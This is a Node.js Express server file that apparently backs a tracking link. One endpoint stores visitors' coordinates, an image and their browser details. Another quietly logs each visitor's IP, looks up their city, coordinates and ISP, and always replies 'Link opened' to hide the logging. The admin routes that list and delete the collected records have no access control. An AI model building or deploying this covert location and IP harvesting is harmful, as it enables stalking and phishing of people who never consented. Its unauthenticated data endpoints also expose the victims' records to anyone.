const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const fetch = require("node-fetch");

require("dotenv").config();

const app = express();
app.set("trust proxy", true);

/* Middleware */
app.use(cors());
app.use(express.json({ limit: "15mb" }));
app.use(express.urlencoded({
  extended: true,
  limit: "15mb"
}));

/* =======================
   MongoDB Connection
======================= */
async function connectionDB() {
  try {
    if (mongoose.connection.readyState === 1) return;

    await mongoose.connect(process.env.dbURL);
    console.log("MongoDB connected");
  } catch (err) {
    console.error("MongoDB connection failed:", err);
    process.exit(1); // Render restart
  }
}

/* =======================
   Schemas
======================= */
const dataSchema = new mongoose.Schema(
  {
    latitude: String,
    longitude: String,
    image: String,
    userAgent: String,
    time: String,
  },
  { timestamps: true }
);

const trackerSchema = new mongoose.Schema(
  {
    ip: String,
    userAgent: String,
    time: String,
    country: String,
    region: String,
    city: String,
    latitude: Number,
    longitude: Number,
    isp: String,
  },
  { timestamps: true }
);


const CollectedData =
  mongoose.models.CollectedData ||
  mongoose.model("CollectedData", dataSchema);

const TrackedData =
  mongoose.models.TrackedData ||
  mongoose.model("TrackedData", trackerSchema);

app.get("/", (req, res) => {
  res.send("Backend is running 🚀");
});

app.post("/collect", async (req, res) => {
  try {
    await connectionDB();
    console.log("Incoming body:", req.body);
    await CollectedData.create(req.body);
    res.json({ message: "Data stored successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to store data" });
  }
});

app.get("/admin/data", async (req, res) => {
  try {
    await connectionDB();
    const allData = await CollectedData.find().sort({ createdAt: -1 });
    res.json(allData);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to fetch data" });
  }
});

app.delete("/admin/clear", async (req, res) => {
  try {
    await connectionDB();
    const result = await CollectedData.deleteMany({});
    res.json({ message: `Deleted ${result.deletedCount} records` });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to clear data" });
  }
});

app.get("/track", async (req, res) => {
  try {
    await connectionDB();

    let ip = getPublicIP(req) || "8.8.8.8";

    ip = ip.replace("::ffff:", "");

    let location = {};

    try {
      const response = await fetch(`https://ipwho.is/${ip}`);
      const data = await response.json();

      if (data.success) {
        location = data;
      } else {
        console.warn("IP lookup failed:", data.message);
      }
    } catch (apiErr) {
      console.error("IP API failed:", apiErr.message);
    }

    await TrackedData.create({
      ip,
      userAgent: req.headers["user-agent"] || "unknown",
      time: new Date().toLocaleString("en-IN"),

      country: location.country || "unknown",
      region: location.region || "unknown",
      city: location.city || "unknown",

      latitude: location.latitude ?? null,
      longitude: location.longitude ?? null,

      isp: location.isp || "unknown",
    });

    // 🔐 Always return success
    res.status(200).send("Link opened");
  } catch (err) {
    console.error("Track route crashed:", err);
    res.status(200).send("Link opened");
  }
});

function getPublicIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  let ip = forwarded ? forwarded.split(",")[0].trim() : req.socket.remoteAddress;

  if (!ip) return null;

  ip = ip.replace("::ffff:", "");

  // block private & localhost IPs
  const blocked = [
    /^127\./,
    /^10\./,
    /^192\.168\./,
    /^172\.(1[6-9]|2\d|3[0-1])\./,
    /^::1$/,
  ];

  if (blocked.some((r) => r.test(ip))) return null;

  return ip;
}


app.get("/tracked/data", async (req, res) => {
  try {
    await connectionDB();
    const allData = await TrackedData.find().sort({ createdAt: -1 });
    res.status(200).json(allData);
  } catch (err) {
    console.error("Tracked data error:", err);
    res.status(500).json({ error: "Failed to fetch tracked data" });
  }
});

app.delete("/tracked/data/delete",async (req,res)=> {
  try{
    await connectionDB();
    const result = await TrackedData.deleteMany({});
    res.json({message: `Deleted ${result.deletedCount} records`});
  }catch(err){
    console.error("data not deleted", err);
    res.status(500).json({ message: "Failed to delete tracked data" });
  }
})

app.use((req, res) => {
  res.status(404).json({ message: "Route not found" });
});


/* =======================
   Server Start (Render)
======================= */
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
